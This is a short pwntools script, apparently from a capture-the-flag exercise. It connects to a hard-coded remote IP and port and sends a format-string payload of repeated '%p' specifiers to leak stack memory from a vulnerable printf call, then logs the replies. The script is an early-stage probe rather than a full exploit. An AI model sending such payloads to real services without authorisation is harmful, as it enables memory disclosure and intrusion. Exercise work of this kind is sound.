from pwn import *

context.log_level = 'debug'

conn = remote('39.96.193.120', 10000)

# Receive initial message
response = conn.recv(timeout=5)
log.info(f"Received: {response}")

# The buffer is at ebp-0x28, and read reads 0x20 bytes
# printf(buf) is the format string vulnerability
# The program flow: read -> printf -> check target_val

# Let's try a simpler format string - maybe the issue is the newline
# Use %p instead of %x for clearer output
payload = b'AAAA.%p.%p.%p.%p.%p.%p.%p.%p'
conn.send(payload)

import time
time.sleep(1)

# Try to receive everything
try:
    response2 = conn.recv(timeout=5)
    log.info(f"Response after fmt: {response2}")
except:
    log.info("No response after fmt")

# Maybe the printf output comes before "Hope you have a good time here."
# Let's try receiving more
try:
    response3 = conn.recv(timeout=3)
    log.info(f"More response: {response3}")
except:
    log.info("No more response")

conn.close()